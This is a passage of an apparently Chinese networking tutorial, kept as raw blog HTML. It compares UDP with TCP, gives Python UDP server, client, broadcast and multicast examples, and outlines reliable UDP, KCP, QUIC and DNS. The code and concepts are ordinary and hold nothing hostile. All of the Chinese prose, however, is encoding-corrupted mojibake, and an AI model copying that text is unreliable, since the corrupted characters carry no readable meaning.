class="hljs-bullet">- </span>ç†è®ºä¸Šå¯ä»¥å æ»¡å¸¦å®½<br><br>TCPï¼š<br><span class="hljs-bullet">- </span>æ…¢å¯åŠ¨é˜¶æ®µè¾ƒæ…¢<br><span class="hljs-bullet">- </span>æ‹¥å¡æ§åˆ¶é™åˆ¶é€Ÿåº¦<br><span class="hljs-bullet">- </span>å®é™…ååé‡ &lt; å¸¦å®½<br><br>ä½†æ˜¯ï¼š<br>TCPä¿è¯å¯é ä¼ è¾“<br>UDPå¯èƒ½å¤§é‡ä¸¢åŒ…ï¼ˆå°¤å…¶æ˜¯æ‹¥å¡æ—¶ï¼‰<br></code></pre></td></tr></table></figure><h3 id="3-3-ä½¿ç”¨åœºæ™¯å¯¹æ¯”"><a href="#3-3-ä½¿ç”¨åœºæ™¯å¯¹æ¯”" class="headerlink" title="3.3 ä½¿ç”¨åœºæ™¯å¯¹æ¯”"></a>3.3 ä½¿ç”¨åœºæ™¯å¯¹æ¯”</h3><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs armasm">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚          åœºæ™¯é€‰æ‹©å†³ç­–æ ‘                          â”‚<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br><br>                   å¼€å§‹<br>                    â†“<br>         éœ€è¦å¯é ä¼ è¾“ï¼Ÿ<br>            â†™      â†˜<br>          æ˜¯        å¦<br>          â†“         â†“<br>        TCP    å®æ—¶æ€§é‡è¦ï¼Ÿ<br>                â†™      â†˜<br>              æ˜¯        å¦<br>              â†“         â†“<br>            UDP    æ•°æ®é‡å°ï¼Ÿ<br>                    â†™      â†˜<br>                  æ˜¯        å¦<br>                  â†“         â†“<br>                UDP       TCP<br><br>å…·ä½“åœºæ™¯ï¼š<br><br><span class="hljs-symbol">TCP</span>ï¼š<br>âœ… HTTP/HTTPSï¼ˆç½‘é¡µæµè§ˆï¼‰<br>âœ… FTPï¼ˆæ–‡ä»¶ä¼ è¾“ï¼‰<br>âœ… SMTP/POP3/IMAPï¼ˆé‚®ä»¶ï¼‰<br>âœ… SSH/Telnetï¼ˆè¿œç¨‹ç™»å½•ï¼‰<br>âœ… æ•°æ®åº“è¿æ¥<br><br><span class="hljs-symbol">UDP</span>ï¼š<br>âœ… DNSï¼ˆåŸŸåæŸ¥è¯¢ï¼‰<br>âœ… DHCPï¼ˆ<span class="hljs-built_in">IP</span>åœ°å€åˆ†é…ï¼‰<br>âœ… è§†é¢‘ç›´æ’­<br>âœ… è¯­éŸ³é€šè¯ï¼ˆVoIPï¼‰<br>âœ… ç½‘ç»œæ¸¸æˆ<br>âœ… NTPï¼ˆæ—¶é—´åŒæ­¥ï¼‰<br>âœ… SNMPï¼ˆç½‘ç»œç®¡ç†ï¼‰<br>âœ… TFTPï¼ˆç®€å•æ–‡ä»¶ä¼ è¾“ï¼‰<br></code></pre></td></tr></table></figure><hr><h2 id="4-UDPç¼–ç¨‹"><a href="#4-UDPç¼–ç¨‹" class="headerlink" title="4. UDPç¼–ç¨‹"></a>4. UDPç¼–ç¨‹</h2><h3 id="4-1-UDP-Socket-API"><a href="#4-1-UDP-Socket-API" class="headerlink" title="4.1 UDP Socket API"></a>4.1 UDP Socket API</h3><p><strong>æœåŠ¡å™¨ç«¯æµç¨‹</strong>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-number">1.</span> socket()     <span class="hljs-comment"># åˆ›å»ºUDP socket</span><br><span class="hljs-number">2.</span> bind()       <span class="hljs-comment"># ç»‘å®šåˆ°æœ¬åœ°åœ°å€å’Œç«¯å£</span><br><span class="hljs-number">3.</span> recvfrom()   <span class="hljs-comment"># æ¥æ”¶æ•°æ®ï¼ˆé˜»å¡ç­‰å¾…ï¼‰</span><br><span class="hljs-number">4.</span> sendto()     <span class="hljs-comment"># å‘é€å“åº”</span><br><span class="hljs-number">5.</span> close()      <span class="hljs-comment"># å…³é—­socket</span><br></code></pre></td></tr></table></figure><p><strong>å®¢æˆ·ç«¯æµç¨‹</strong>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-number">1.</span> socket()     <span class="hljs-comment"># åˆ›å»ºUDP socket</span><br><span class="hljs-number">2.</span> sendto()     <span class="hljs-comment"># å‘é€æ•°æ®åˆ°æœåŠ¡å™¨</span><br><span class="hljs-number">3.</span> recvfrom()   <span class="hljs-comment"># æ¥æ”¶å“åº”</span><br><span class="hljs-number">4.</span> close()      <span class="hljs-comment"># å…³é—­socket</span><br></code></pre></td></tr></table></figure><p><strong>å…³é”®åŒºåˆ«</strong>ï¼š</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">UDP</span> <span class="hljs-variable">vs</span> <span class="hljs-variable">TCP</span> <span class="hljs-variable">Socket</span>ï¼š<br><br><span class="hljs-variable">TCP</span>ï¼š<br>- <span class="hljs-function"><span class="hljs-title">connect</span>() å»ºç«‹è¿æ¥</span><br><span class="hljs-function">- <span class="hljs-title">send</span>()/<span class="hljs-title">recv</span>() å‘é€/æ¥æ”¶æ•°æ®</span><br><span class="hljs-function">- ä¸éœ€è¦æŒ‡å®šç›®æ ‡åœ°å€ï¼ˆå·²è¿æ¥ï¼‰</span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-variable">UDP</span>ï¼š</span><br><span class="hljs-function">- ä¸éœ€è¦ <span class="hljs-title">connect</span>()</span><br>- <span class="hljs-function"><span class="hljs-title">sendto</span>()/<span class="hljs-title">recvfrom</span>() æ¯æ¬¡éƒ½è¦æŒ‡å®šåœ°å€</span><br><span class="hljs-function">- å¯ä»¥ä¸å¤šä¸ªå¯¹ç«¯é€šä¿¡</span><br></code></pre></td></tr></table></figure><h3 id="4-2-UDPæœåŠ¡å™¨ç¤ºä¾‹"><a href="#4-2-UDPæœåŠ¡å™¨ç¤ºä¾‹" class="headerlink" title="4.2 UDPæœåŠ¡å™¨ç¤ºä¾‹"></a>4.2 UDPæœåŠ¡å™¨ç¤ºä¾‹</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<br><br><span class="hljs-comment"># åˆ›å»ºUDP socket</span><br>server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)<br><br><span class="hljs-comment"># ç»‘å®šåœ°å€å’Œç«¯å£</span><br>server_address = (<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, <span class="hljs-number">9999</span>)<br>server_socket.bind(server_address)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;UDPæœåŠ¡å™¨å¯åŠ¨åœ¨ <span class="hljs-subst">&#123;server_address&#125;</span>&quot;</span>)<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-comment"># æ¥æ”¶æ•°æ®ï¼ˆé˜»å¡ï¼‰</span><br>    data, client_address = server_socket.recvfrom(<span class="hljs-number">4096</span>)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;æ”¶åˆ°æ¥è‡ª <span class="hljs-subst">&#123;client_address&#125;</span> çš„æ•°æ®: <span class="hljs-subst">&#123;data.decode()&#125;</span>&quot;</span>)<br><br>    <span class="hljs-comment"># å‘é€å“åº”</span><br>    response = <span class="hljs-string">f&quot;æœåŠ¡å™¨å·²æ”¶åˆ°: <span class="hljs-subst">&#123;data.decode()&#125;</span>&quot;</span><br>    server_socket.sendto(response.encode(), client_address)<br></code></pre></td></tr></table></figure><h3 id="4-3-UDPå®¢æˆ·ç«¯ç¤ºä¾‹"><a href="#4-3-UDPå®¢æˆ·ç«¯ç¤ºä¾‹" class="headerlink" title="4.3 UDPå®¢æˆ·ç«¯ç¤ºä¾‹"></a>4.3 UDPå®¢æˆ·ç«¯ç¤ºä¾‹</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<br><br><span class="hljs-comment"># åˆ›å»ºUDP socket</span><br>client_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)<br><br><span class="hljs-comment"># æœåŠ¡å™¨åœ°å€</span><br>server_address = (<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, <span class="hljs-number">9999</span>)<br><br><span class="hljs-comment"># å‘é€æ•°æ®</span><br>message = <span class="hljs-string">&quot;Hello UDP Server!&quot;</span><br>client_socket.sendto(message.encode(), server_address)<br><br><span class="hljs-comment"># æ¥æ”¶å“åº”</span><br>data, server = client_socket.recvfrom(<span class="hljs-number">4096</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;æ”¶åˆ°æœåŠ¡å™¨å“åº”: <span class="hljs-subst">&#123;data.decode()&#125;</span>&quot;</span>)<br><br><span class="hljs-comment"># å…³é—­socket</span><br>client_socket.close()<br></code></pre></td></tr></table></figure><h3 id="4-4-UDPç‰¹æ€§ç¤ºä¾‹"><a href="#4-4-UDPç‰¹æ€§ç¤ºä¾‹" class="headerlink" title="4.4 UDPç‰¹æ€§ç¤ºä¾‹"></a>4.4 UDPç‰¹æ€§ç¤ºä¾‹</h3><p><strong>ç¤ºä¾‹1ï¼šæ•°æ®æŠ¥è¾¹ç•Œ</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># TCPï¼ˆå­—èŠ‚æµï¼‰</span><br>tcp_socket.send(<span class="hljs-string">b&quot;Hello&quot;</span>)<br>tcp_socket.send(<span class="hljs-string">b&quot;World&quot;</span>)<br><span class="hljs-comment"># æ¥æ”¶æ–¹å¯èƒ½ä¸€æ¬¡æ€§æ”¶åˆ° &quot;HelloWorld&quot;</span><br><br><span class="hljs-comment"># UDPï¼ˆæ•°æ®æŠ¥ï¼‰</span><br>udp_socket.sendto(<span class="hljs-string">b&quot;Hello&quot;</span>, addr)<br>udp_socket.sendto(<span class="hljs-string">b&quot;World&quot;</span>, addr)<br><span class="hljs-comment"># æ¥æ”¶æ–¹åˆ†ä¸¤æ¬¡æ”¶åˆ° &quot;Hello&quot; å’Œ &quot;World&quot;</span><br></code></pre></td></tr></table></figure><p><strong>ç¤ºä¾‹2ï¼šå¹¿æ’­</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># åˆ›å»ºUDP socket</span><br>sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)<br><br><span class="hljs-comment"># å¯ç”¨å¹¿æ’­</span><br>sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, <span class="hljs-number">1</span>)<br><br><span class="hljs-comment"># å‘é€å¹¿æ’­æ¶ˆæ¯</span><br>broadcast_address = (<span class="hljs-string">&#x27;255.255.255.255&#x27;</span>, <span class="hljs-number">9999</span>)<br>message = <span class="hljs-string">&quot;Broadcast Message&quot;</span><br>sock.sendto(message.encode(), broadcast_address)<br></code></pre></td></tr></table></figure><p><strong>ç¤ºä¾‹3ï¼šç»„æ’­</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> struct<br><br><span class="hljs-comment"># åˆ›å»ºUDP socket</span><br>sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)<br><br><span class="hljs-comment"># ç»„æ’­åœ°å€</span><br>multicast_group = <span class="hljs-string">&#x27;224.0.0.1&#x27;</span><br>multicast_port = <span class="hljs-number">9999</span><br><br><span class="hljs-comment"># åŠ å…¥ç»„æ’­ç»„</span><br>group = socket.inet_aton(multicast_group)<br>mreq = struct.pack(<span class="hljs-string">&#x27;4sL&#x27;</span>, group, socket.INADDR_ANY)<br>sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)<br><br><span class="hljs-comment"># ç»‘å®šç«¯å£</span><br>sock.bind((<span class="hljs-string">&#x27;&#x27;</span>, multicast_port))<br><br><span class="hljs-comment"># æ¥æ”¶ç»„æ’­æ¶ˆæ¯</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    data, address = sock.recvfrom(<span class="hljs-number">1024</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;æ”¶åˆ°ç»„æ’­æ¶ˆæ¯: <span class="hljs-subst">&#123;data.decode()&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><hr><h2 id="5-åŸºäºUDPå®ç°å¯é ä¼ è¾“"><a href="#5-åŸºäºUDPå®ç°å¯é ä¼ è¾“" class="headerlink" title="5. åŸºäºUDPå®ç°å¯é ä¼ è¾“"></a>5. åŸºäºUDPå®ç°å¯é ä¼ è¾“</h2><h3 id="5-1-ä¸ºä»€ä¹ˆè¦åœ¨UDPä¸Šå®ç°å¯é ä¼ è¾“ï¼Ÿ"><a href="#5-1-ä¸ºä»€ä¹ˆè¦åœ¨UDPä¸Šå®ç°å¯é ä¼ è¾“ï¼Ÿ" class="headerlink" title="5.1 ä¸ºä»€ä¹ˆè¦åœ¨UDPä¸Šå®ç°å¯é ä¼ è¾“ï¼Ÿ"></a>5.1 ä¸ºä»€ä¹ˆè¦åœ¨UDPä¸Šå®ç°å¯é ä¼ è¾“ï¼Ÿ</h3><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">UDPçš„é—®é¢˜ï¼š<br>âŒ æ•°æ®å¯èƒ½ä¸¢å¤±<br>âŒ æ•°æ®å¯èƒ½ä¹±åº<br>âŒ æ•°æ®å¯èƒ½é‡å¤<br><br>ä½†UDPçš„ä¼˜åŠ¿ï¼š<br>âœ… å»¶è¿Ÿä½<br>âœ… å¯ä»¥å®šåˆ¶å¯é æ€§æœºåˆ¶<br>âœ… é¿å…TCPçš„å›ºæœ‰é™åˆ¶<br><br>è§£å†³æ–¹æ¡ˆï¼š<br>åœ¨åº”ç”¨å±‚å®ç°å¯é ä¼ è¾“æœºåˆ¶<br><span class="hljs-section">= UDPçš„é€Ÿåº¦ + è‡ªå®šä¹‰çš„å¯é æ€§</span><br></code></pre></td></tr></table></figure><h3 id="5-2-å¯é UDPçš„å®ç°è¦ç‚¹"><a href="#5-2-å¯é UDPçš„å®ç°è¦ç‚¹" class="headerlink" title="5.2 å¯é UDPçš„å®ç°è¦ç‚¹"></a>5.2 å¯é UDPçš„å®ç°è¦ç‚¹</h3><p><strong>1. åºåˆ—å·</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">æ¯ä¸ªæ•°æ®åŒ…æ·»åŠ åºåˆ—å·<br><br>æ•°æ®åŒ…æ ¼å¼ï¼š<br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚ åºåˆ—å· (<span class="hljs-number">4</span>å­—èŠ‚)                   â”‚<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>â”‚ æ•°æ®                             â”‚<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br><br>ä½œç”¨ï¼š<br>- æ£€æµ‹ä¸¢åŒ…ï¼ˆåºåˆ—å·è·³è·ƒï¼‰<br>- æ£€æµ‹é‡å¤ï¼ˆç›¸åŒåºåˆ—å·ï¼‰<br>- é‡æ’åºï¼ˆæŒ‰åºåˆ—å·æ’åºï¼‰<br></code></pre></td></tr></table></figure><p><strong>2. ç¡®è®¤æœºåˆ¶</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">æ¥æ”¶æ–¹å‘é€ACKç¡®è®¤<br><br>ACKåŒ…æ ¼å¼ï¼š<br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚ ACKæ ‡å¿— (<span class="hljs-number">1</span>å­—èŠ‚)                  â”‚<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>â”‚ ç¡®è®¤åºåˆ—å· (<span class="hljs-number">4</span>å­—èŠ‚)               â”‚<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br><br>ç­–ç•¥ï¼š<br>- ç´¯ç§¯ç¡®è®¤ï¼šACK=nè¡¨ç¤ºå·²æ”¶åˆ°nä¹‹å‰çš„æ‰€æœ‰åŒ…<br>- é€‰æ‹©ç¡®è®¤ï¼šç±»ä¼¼TCPçš„SACK<br></code></pre></td></tr></table></figure><p><strong>3. è¶…æ—¶é‡ä¼ </strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">å‘é€æ–¹ï¼š<br><span class="hljs-number">1.</span> å‘é€æ•°æ®åŒ…<br><span class="hljs-number">2.</span> å¯åŠ¨å®šæ—¶å™¨<br><span class="hljs-number">3.</span> ç­‰å¾…ACK<br>   - æ”¶åˆ°ACKï¼šå–æ¶ˆå®šæ—¶å™¨<br>   - è¶…æ—¶ï¼šé‡ä¼ æ•°æ®åŒ…<br><br>RTOè®¡ç®—ï¼š<br>å¯ä»¥ä½¿ç”¨ç®€åŒ–çš„ç®—æ³•<br>RTO = Î± Ã— RTT<br>Î± = <span class="hljs-number">1.5</span>~<span class="hljs-number">2.0</span><br></code></pre></td></tr></table></figure><p><strong>4. çª—å£æœºåˆ¶</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">æ»‘åŠ¨çª—å£ï¼š<br>- é™åˆ¶æœªç¡®è®¤çš„æ•°æ®åŒ…æ•°é‡<br>- æé«˜ä¼ è¾“æ•ˆç‡<br><br>ç¤ºä¾‹ï¼š<br>çª—å£å¤§å° = <span class="hljs-number">4</span><br><br>å‘é€åºåˆ—ï¼š<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span><br>æ”¶åˆ°ACK(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)<br>å¯ä»¥å‘é€ï¼š<span class="hljs-number">5</span>, <span class="hljs-number">6</span><br></code></pre></td></tr></table></figure><h3 id="5-3-å¯é UDPåè®®ç¤ºä¾‹ï¼ˆRUDPï¼‰"><a href="#5-3-å¯é UDPåè®®ç¤ºä¾‹ï¼ˆRUDPï¼‰" class="headerlink" title="5.3 å¯é UDPåè®®ç¤ºä¾‹ï¼ˆRUDPï¼‰"></a>5.3 å¯é UDPåè®®ç¤ºä¾‹ï¼ˆRUDPï¼‰</h3><p><strong>åè®®è®¾è®¡</strong>ï¼š</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs armasm">æ•°æ®åŒ…æ ¼å¼ï¼š<br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚ ç±»å‹ (<span class="hljs-number">1</span>å­—èŠ‚)                     â”‚  <span class="hljs-meta">DATA</span>/ACK/FIN<br>â”‚ åºåˆ—å· (<span class="hljs-number">4</span>å­—èŠ‚)                   â”‚<br>â”‚ æ ¡éªŒå’Œ (<span class="hljs-number">4</span>å­—èŠ‚)                   â”‚<br>â”‚ æ•°æ®é•¿åº¦ (<span class="hljs-number">2</span>å­—èŠ‚)                 â”‚<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>â”‚ æ•°æ®                             â”‚<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br><br>ç‰¹æ€§ï¼š<br>âœ… åºåˆ—å·ï¼šæ£€æµ‹ä¸¢åŒ…å’Œä¹±åº<br>âœ… ACKï¼šç¡®è®¤æœºåˆ¶<br>âœ… è¶…æ—¶é‡ä¼ ï¼šä¿è¯å¯é æ€§<br>âœ… æ»‘åŠ¨çª—å£ï¼šæé«˜æ•ˆç‡<br>âœ… æ ¡éªŒå’Œï¼šæ£€æµ‹é”™è¯¯<br></code></pre></td></tr></table></figure><p><strong>å®é™…åº”ç”¨</strong>ï¼š</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">KCPåè®®ï¼ˆå¿«é€Ÿå¯é åè®®ï¼‰ï¼š<br><span class="hljs-bullet">- </span>ç”±äº‘é£å¼€å‘<br><span class="hljs-bullet">- </span>æ¸¸æˆè¡Œä¸šå¹¿æ³›ä½¿ç”¨<br><span class="hljs-bullet">- </span>æ¯”TCPå¿«30%-40%<br><span class="hljs-bullet">- </span>å®ç°äº†ARQï¼ˆè‡ªåŠ¨é‡ä¼ è¯·æ±‚ï¼‰<br><br>QUICåè®®ï¼ˆQuick UDP Internet Connectionsï¼‰ï¼š<br><span class="hljs-bullet">- </span>Googleå¼€å‘<br><span class="hljs-bullet">- </span>HTTP/3çš„åŸºç¡€<br><span class="hljs-bullet">- </span>0-RTTè¿æ¥å»ºç«‹<br><span class="hljs-bullet">- </span>æ›´å¥½çš„æ‹¥å¡æ§åˆ¶<br><span class="hljs-bullet">- </span>å·²æ ‡å‡†åŒ–ä¸ºRFC 9000<br></code></pre></td></tr></table></figure><hr><h2 id="6-UDPå¸¸è§åº”ç”¨"><a href="#6-UDPå¸¸è§åº”ç”¨" class="headerlink" title="6. UDPå¸¸è§åº”ç”¨"></a>6. UDPå¸¸è§åº”ç”¨</h2><h3 id="6-1-DNSæŸ¥è¯¢"><a href="#6-1-DNSæŸ¥è¯¢" class="headerlink" title="6.1 DNSæŸ¥è¯¢"></a>6.1 DNSæŸ¥è¯¢</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs markdown">ä¸ºä»€ä¹ˆDNSä½¿ç”¨UDPï¼Ÿ<br><br><span class="hljs-bullet">1.</span> è¯·æ±‚-å“åº”æ¨¡å¼<br><span class="hljs-bullet">   -</span> å•ä¸ªè¯·æ±‚ï¼Œå•ä¸ªå“åº”<br><span class="hljs-bullet">   -</span> é€‚åˆæ— è¿æ¥<br><br><span class="hljs-bullet">2.</span> æ•°æ®é‡å°<br><span class="hljs-bullet">   -</span> å¤§éƒ¨åˆ†æŸ¥è¯¢å’Œå“åº” &lt; 512å­—èŠ‚<br><span class="hljs-bullet">   -</span> å•ä¸ªUDPåŒ…å¯ä»¥å®¹çº³<br><br><span class="hljs-bullet">3.</span> é€Ÿåº¦å¿«<br><span class="hljs-bullet">   -</span> æ— éœ€å»ºç«‹è¿æ¥<br><span class="hljs-bullet">   -</span> 